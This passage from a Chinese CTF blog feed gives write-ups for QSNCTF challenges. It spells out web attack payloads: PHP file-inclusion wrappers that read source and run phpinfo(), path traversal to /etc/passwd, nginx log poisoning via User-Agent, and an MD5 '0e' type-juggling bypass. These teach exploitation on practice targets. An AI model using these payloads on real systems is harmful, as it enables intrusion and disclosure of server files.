class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.q1jun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Integer[] compare = &#123;<span class="number">404</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">368</span>, <span class="number">220</span>, <span class="number">436</span>, <span class="number">412</span>, <span class="number">452</span>, <span class="number">432</span>, <span class="number">200</span>, <span class="number">412</span>&#125;;</span><br><span class="line">        List&lt;Integer&gt; ccompare = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(Arrays.asList(compare));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i: ccompare)</span><br><span class="line"></span><br><span class="line">            System.out.print(Character.toChars((i&gt;&gt;<span class="number">2</span>)^<span class="number">3</span>));</span><br><span class="line">        <span class="comment">//f4n_4ndro1d</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f4n_4ndro1d</span><br></pre></td></tr></table></figure><p>把apk安装一下，打开输入刚刚得到的用户名和密码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004111824869.png" alt="image-20221004111824869"></p><p>点击登入，即可获得flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221004111903164.png" alt="image-20221004111903164"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> QSNCTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]Web-CheckMe01-04 writeup</title>
      <link href="/2022/10/02/44008f7238c3-q1jun/"/>
      <url>/2022/10/02/44008f7238c3-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-CheckMe01"><a href="#0x01-CheckMe01" class="headerlink" title="0x01 CheckMe01"></a>0x01 CheckMe01</h2><p>进入环境，随意输入字符：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002121613125.png" alt="image-20221002121613125"></p><p>看一下代码，发现<code>$keys = base64_decode(urldecode($keys));</code></p><p>说明需要先将<code>qsnctf</code>字符进行base64编码才能使<code>$keys==&quot;qsnctf&quot;</code>判断成立。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002121753174.png" alt="image-20221002121753174"></p><p>所以输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cXNuY3Rm</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002121844048.png" alt="image-20221002121844048"></p><h2 id="0x02-CheckMe02"><a href="#0x02-CheckMe02" class="headerlink" title="0x02 CheckMe02"></a>0x02 CheckMe02</h2><p>打开题目的环境，发现是文件包含题：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002122324748.png" alt="image-20221002122324748"></p><p>通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>php伪协议可以查看到<code>index.php</code>的源码的base64：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHRpdGxlPkNoZWNrTWUtMDI8L3RpdGxlPg0KPD9waHANCnByaW50KCI8aDE+<span class="number">5</span>qyi6L+O5p2l5YiwQ2hlY2tNZS0wMu+<span class="number">8</span>jOW/q+adpeWvu+aJvuS9oOeahEZsYWflubbmj5DkuqTlkKfjgII8L2gxPiIpOw0KPz4NCjw/cGhwDQplcnJvcl9yZXBvcnRpbmcoMCk7DQokdXJsPSRfR0VUWyd1cmwnXTsNCmlmKGlzc2V0KCR1cmwpKXsNCiAgICBpbmNsdWRlKCR1cmwpOw0KfQ0KICAgIA0KPz4NCjxodG1sIGxhbmc9InpoLUNOIj4NCjw/cGhwDQogICAgICAgICAgICANCiAgICAgICAgICAgICRjb2RlPSI8P3BocCBpbmNsdWRlKCQiLiJfR0VUWyd1cmwnXSk7Pz4iOw0KICAgICAgICAgICAgaGlnaGxpZ2h0X3N0cmluZygkY29kZSk7DQogICAgPz4NCg==</span><br></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;CheckMe-<span class="number">02</span>&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;h1&gt;欢迎来到CheckMe-02，快来寻找你的Flag并提交吧。&lt;/h1&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$code</span>=<span class="string">&quot;&lt;?php include($&quot;</span>.<span class="string">&quot;_GET[&#x27;url&#x27;]);?&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出并没有做任何过滤，试试读取phpinfo()：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002122920746.png" alt="image-20221002122920746"></p><p>直接读取到FLAG。</p><h2 id="0x03-CheckMe03"><a href="#0x03-CheckMe03" class="headerlink" title="0x03 CheckMe03"></a>0x03 CheckMe03</h2><p>打开题目环境：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002123524270.png" alt="image-20221002123524270"></p><p>还是文件包含题目，相比于<code>CheckMe02</code>这题把php伪协议过滤了。</p><p>但是还是可以读取到文件，比如<code>/etc/passwd</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002123739090.png" alt="image-20221002123739090"></p><p>那说明还可以通过日志来解析PHP语句。</p><p>根据nginx配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=../../../etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002123900075.png" alt="image-20221002123900075"></p><p>可以推测<strong>access.log</strong>文件所在位置为<code>/var/log/nginx/access.log</code>，这个日志文件会记录http请求日志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002124036248.png" alt="image-20221002124036248"></p><p>所以通过发送一个包含<code>&lt;?php phpinfo();?&gt;</code>语句的http请求来写入<code>access.log</code>文件，这里就要用到<code>burpsuite</code>来拦截请求包，修改里面的<code>User-Agent</code>字段：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002124529654.png" alt="image-20221002124529654"></p><p>然后再通过文件包含漏洞访问<code>access.log</code>日志文件：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002124615125.png" alt="image-20221002124615125"></p><p>找到<code>FLAG</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002124646399.png" alt="image-20221002124646399"></p><h2 id="0x04-CheckMe04"><a href="#0x04-CheckMe04" class="headerlink" title="0x04 CheckMe04"></a>0x04 CheckMe04</h2><p>打开题目环境：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002125008667.png" alt="image-20221002125008667"></p><p>分析一下这段代码，变量<strong>a</strong>只能为字母，<strong>b</strong>只能为数字，然后他们各自的<code>MD5</code>值如果想等就输出flag。</p><p>这里通过0e截断可以做到，因为<code>0e</code>在是科学计数的语法，0e后面不管多大都是0</p><p><strong>所以只需要找到两个0e开头的md5就行了</strong></p><p>但不要忘了a只能是字母，b只能是数字：</p><blockquote><p>a &#x3D; QNKCDZO</p><p>md5(a) &#x3D; 0e830400451993494058024219903391</p><p>b &#x3D; 240610708</p><p>md5(b) &#x3D; 0e462097431906509019562988736854</p></blockquote><p>所以Payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221002125712512.png" alt="image-20221002125712512"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]misc-上号</title>
      <link href="/2022/09/30/17c41f80ef9f-q1jun/"/>
      <url>/2022/09/30/17c41f80ef9f-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930232121934.png" alt="image-20220930232121934"></p><p>附件是一个流量包&#96;&#96;files.pcapng&#96;</p><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>拿到流量包，发现只有102kb大小，直接一个binwalk:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e files.pcapng</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930232403215.png" alt="image-20220930232403215"></p><p>提取到一个图片，打开是这样的：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930232452330.png" alt="image-20220930232452330"></p><p>用线上steg工具看看：<a target="_blank" rel="noopener" href="https://stegonline.georgeom.net/upload">StegOnline (georgeom.net)</a></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930232630586.png" alt="image-20220930232630586"></p><p>没看到什么有用的信息，倒是在strings中发现了qsnctf这个神秘代码。。。</p><p>推测是用<code>steghide</code>隐藏的flag，</p><p>打开<code>kali</code>，上号！</p><p>用steghide提取flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf shanghao.jpg</span><br></pre></td></tr></table></figure><p>输入密码：<code>qsnctf</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930232855106.png" alt="image-20220930232855106"></p><p>提取成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qsnctf&#123;07f453cd-8fd2-44e4-bdd1-160b0c503d10&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Misc </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]misc-base64隐写</title>
      <link href="/2022/09/29/513f1ee00804-q1jun/"/>
      <url>/2022/09/29/513f1ee00804-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220930234156115.png" alt="image-20220930234156115"></p><p>附件： <code>ComeOn!.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">STJsdVkyeDFaR1U4YVc5emRISmxZVzArQ2c9PQ1=</span><br><span class="line">STJsdVkyeDFaR1U4YzNSeWFXNW5QZ289DQ==</span><br><span class="line">STJsdVkyeDFaR1U4WTNOMGNtbHVaejRLDV==</span><br><span class="line">STJsdVkyeDFaR1U4WTNOMFpHbHZQZ289DQ==</span><br><span class="line">STJSbFptbHVaU0J0WVhodUlEazVPUW89Dd==</span><br><span class="line">Q2c9PQ1=</span><br><span class="line">ZFhOcGJtY2dibUZ1WlhOd1lXTmxJSE4wWkRzSw1=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">WTJoaGNpUmpZVnR0WVhodVhTd2dZMkpiYldGNGJsMDdDZz09DU==</span><br><span class="line">Q2c9PQ1=</span><br><span class="line">YVc1MElHTnRjQ2h6ZEhKcGJtY2dZU3dnYzNSeWFXNW5JR2lwQ2c9PQ2=</span><br><span class="line">ZXdvPQ1=</span><br><span class="line">SUNBZ3lHbG1LR3V1YzJsNlpTZ3BJRDRnWWk1emFYcGxLQ2twQ2c9PQ3=</span><br><span class="line">SUNBZ0lDbWdJb0J5WlhSMWNtNGdNVHNLDb==</span><br><span class="line">SUNBZ0lHVnNjMlVnYVdZb1lTNXphWHBsS0NrZ1BDQmlMbk5wZW1Vb0tTa0sN</span><br><span class="line">SUNBZ0lDQWdJQ0J5WlhSMWNtNGdMVEU3Q2c9PQ0=</span><br><span class="line">SUNBZ0lHVnNjMlVLDd==</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JtYjNJb2FXNTBJR2tnUFNBd095QnBJRHdnWVM1emFYcGxLQ2s3SUdrckt5a0sN</span><br><span class="line">SUNBZ2lDQWdJQ2I3Q2c9PQ2=</span><br><span class="line">SUNBZ1lDQWdJQ1FnSUNBZ2FXWW9ZVnRwWFNBOElHSmJhVjBwQ2c9PQ1=</span><br><span class="line">SUNBZ0lDYWdJY0FnSUNBZ0lDYWdJSEpsZEhWeWJpYXRNVHNLDY==</span><br><span class="line">SUNBZ1lDQWdJQ1FnSUNBZ2FXWW9ZVnRwWFNBK1lHSmJhVjBwQ2c9PQ1=</span><br><span class="line">SUNBZ0lDXWdJX0FnSUNBZ0lDXWdJSEpsZEhWeWJpXXhPd289DX==</span><br><span class="line">SUNBZ0lDQWdJQ0I5Q2c9PQ0=</span><br><span class="line">SUNBZ0lDdWdJd0J5WlhSMWNtNGdNRHNLDd==</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">ZlFvPQ2=</span><br><span class="line">Q2c9PQ1=</span><br><span class="line">ZG05cFpDQnlaWE5sZEdFb2MzUnlhVzVuSUdFcENnPT0N</span><br><span class="line">ZXdvPQ1=</span><br><span class="line">SUNBZ1lHMWxiWE5sZENoallTd3dMSE5wZW1WdlppaGpZU2twT3dvPQ1=</span><br><span class="line">SUNBZ2lHWnZjaWhwYm5RZ2FTQTlJREE3SUdrZ1BDQmhMbk5wZW1Vb2tUc2dhU3NyS1FvPQ2=</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JqWVZ0cFhTQTlJR0ZiWVM1emFYcGxLQ2t0TVMxcFhTQXRJQ2N3SnpzSw0=</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">ZlFvPQ2=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">ZG05cFpDQnlaWE5sZEdJb2MzUnlhVzVuSUdJcENnPT0N</span><br><span class="line">ZXdvPQ3=</span><br><span class="line">SUNBZ1lHMWxiWE5sZENoallpd3dMSE5wZW1WdlppaGpZaWtwT3dvPQ1=</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTQTlJREE3SUdrZ1BDQmlMbk5wZW1Vb0tUc2dhU3NyS1FvPQ0=</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ1lDQWdJQ1JqWWx1cFhTQTlJR1piWWk1emFYcGxLQ2t1TVMxcFhTQXRJQ2N3SnpzSw1=</span><br><span class="line">SUNBZ1lDQWdJQ1F2TDNCeWFXNTBaaWdpSldRaUxHTmlXMmxkS1RzSw1=</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">ZlFvPQ3=</span><br><span class="line">Q2c9PQ3=</span><br><span class="line">YzNSeWFXNW5JR1ZrWkNoemRISnBibWNnWVN3Z2MzUnlhVzVuSUdJcEx5L2xpcURtczVVSw1=</span><br><span class="line">ZXdvPQ2=</span><br><span class="line">SUNBZ0lISmxjMlYwWVNoaEtUc3ZMK2FLaXVhdmorUzRnT1M5amVXdG1PZWFoT1d0bCtlc3B1V1BtT2FJa09hVnNPV3RseXpsdWJia3VKVG1pb3JtbGJEbnU0VGxqNDNvdjRmbW5hWGt2ci9rdW83bGtJN3BuYUxrdUkzbGtJemt2WTNtbGJEbm03amxpcUFLDW==</span><br><span class="line">SUNBZ0lISmxjMlYwWWloaUtUc0sN</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTTTlJREE3SUdrZ1BDTnRZWGh1T3lCcEt5c3BDZz09DT==</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JqWVZ0cFhTQTlJR05oVzJsZElDc2dZMkpiYVYwN0NnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0JwWmloallWdHBYU0ErUFNBeUtYc0sN</span><br><span class="line">SUNBZ0lDTWdJT0FnSUNBZ1kyRmJhU3N4WFNBclBTTXhPd289DT==</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ1kyRmJhVjBnTFQwZ01qc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0I5Q2c9PQ0=</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">SUNBZ0lHSnZiMndnWm14aFp5QTlJSFJ5ZFdVN0NnPT0N</span><br><span class="line">SUNBZ3lITjBjbWx1WnlCaklEMGdJaUk3Q2c9PQ3=</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTQTlJRzFoZUc0Z0xTQXhPeUJwSUQ0OUlEQTdJR2t0TFNrSw0=</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JwWmlobWJHRm5JQ1ltSUdOaFcybGRJRDA5SURBcENnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ1kyOXVkR2x1ZFdVN0NnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0JwWmloallWdHBYU0FoUFNBd0tRbz0N</span><br><span class="line">SUNBZ0lDcWdJc0FnSUNBZ1pteGhaeUE5SUdaaGJITmxPd289Dc==</span><br><span class="line">SUNBZ2lDQWdJQ2JqSUNzOUlDaGpZVnRwWFNBcklDY3dKeWs3Q2c9PQ2=</span><br><span class="line">SUNBZ0lDQWdJQ0F2TDNCeWFXNTBaaWdpSldRaUxHTmhXMmxkS1RzSw0=</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">SUNBZ0lHbG1LR1pzWVdjcENnPT0N</span><br><span class="line">SUNBZ1lDQWdJQ1J5WlhSMWNtNGdJakFpT3dvPQ1=</span><br><span class="line">SUNBZ0lHVnNjMlVLDX==</span><br><span class="line">SUNBZ0lDdWdJd0J5WlhSMWNtNGdZenNLDd==</span><br><span class="line">ZlFvPQ0=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">YzNSeWFXNW5JRzFwYm5Vb2MzUnlhVzVuSUdFc0lITjBjbWx1WnlCaUtTOHY1WWVQNXJPVkNnPT0N</span><br><span class="line">ZXdvPQ0=</span><br><span class="line">SUNBZ0lHbHVkQ0J6YVdkdUlEMGdNRHNLDQ==</span><br><span class="line">SUNBZ0lHbG1LR050Y0NoaExDQmlLU0E5UFNBdE1Ta3ZMMkhrdUszbHVwVG9yNlhsclpqb3ZvUGxwS2ZubW9UcGdxUGt1S3JtbGJBSw0=</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0J6YVdkdUlEMGdNVHNLDQ==</span><br><span class="line">SUNBZ0lDQWdJQ0J6ZEhKcGJtY2dkR1Z0Y0NBOUlHRTdDZz09DQ==</span><br><span class="line">SUNBZ0lDQWdJQ0JoSUQwZ1lqc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JpSUQwZ2RHVnRjRHNLDQ==</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">SUNBZ0lISmxjMlYwWVNoaEtUc0sN</span><br><span class="line">SUNBZ0lISmxjMlYwWWloaUtUc0sN</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTQTlJREE3SUdrZ1BDQnRZWGh1T3lCcEt5c3BDZz09DQ==</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JwWmloallWdHBYU0E4SUdOaVcybGRLWHNLDQ==</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ1kyRmJhU3N4WFNBdFBTQXhPd289DQ==</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ1kyRmJhVjBnS3owZ01qc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0I5Q2c9PQ0=</span><br><span class="line">SUNBZ0lDQWdJQ0JqWVZ0cFhTQTlJR05oVzJsZElDMGdZMkpiYVYwN0NnPT0N</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">SUNBZ0lHSnZiMndnWm14aFp5QTlJSFJ5ZFdVN0NnPT0N</span><br><span class="line">SUNBZ0lITjBjbWx1WnlCa0lEMGdJaUk3Q2c9PQ0=</span><br><span class="line">SUNBZ0lHWnZjaWhwYm5RZ2FTQTlJRzFoZUc0Z0xTQXhPeUJwSUQ0OUlEQTdJR2t0TFNrSw0=</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0JwWmlobWJHRm5JQ1ltSUdOaFcybGRJRDA5SURBcENnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ1kyOXVkR2x1ZFdVN0NnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0JwWmloallWdHBYU0FoUFNBd0tRbz0N</span><br><span class="line">SUNBZ0lDQWdJQ0FnSUNBZ1pteGhaeUE5SUdaaGJITmxPd289DQ==</span><br><span class="line">SUNBZ0lDQWdJQ0JrSUNzOUlDaGpZVnRwWFNBcklDY3dKeWs3Q2c9PQ0=</span><br><span class="line">SUNBZ0lDQWdJQ0F2TDNCeWFXNTBaaWdpSldRaUxHTmhXMmxkS1RzSw0=</span><br><span class="line">SUNBZ0lIMEsN</span><br><span class="line">SUNBZ0lHbG1LR1pzWVdjcENnPT0N</span><br><span class="line">SUNBZ0lDQWdJQ0J5WlhSMWNtNGdJakFpT3dvPQ0=</span><br><span class="line">SUNBZ0lHVnNjMlVLDQ==</span><br><span class="line">SUNBZ0lDQWdJQ0J5WlhSMWNtNGdaRHNLDQ==</span><br><span class="line">ZlFvPQ0=</span><br><span class="line">Q2c9PQ0=</span><br><span class="line">YzNSeWFXNW5JRzExYkNoemRISnBibWNnZUN3Z2MzUnlhVzVuSUhrcEx5OXo1TGk2NTZ5bTVZKzM1TDJOQ2c9PQ0=</span><br><span class="line">ZXdvPQ0=</span><br><span class="line">SUNBZ0lHbHVkQ0JzWlc1NElEMGdlQzV6YVhwbEtDazdDZz09DQ==</span><br><span class="line">SUNBZ0lHbHVkQ0JzWlc1NUlEMGdlUzV6YVhwbEtDazdDZz09DQ==</span><br><span class="line">SUNBZ0lHbG1LR3hsYm5nZ1BUMGdNU2tLDQ==</span><br><span class="line">SUNBZ0lIc0sN</span><br><span class="line">SUNBZ0lDQWdJQ0F2TDJOdmRYUThQSGc4UENJZ0lDQWlQRHg1UER4bGJtUnNPd289DQ==</span><br><span 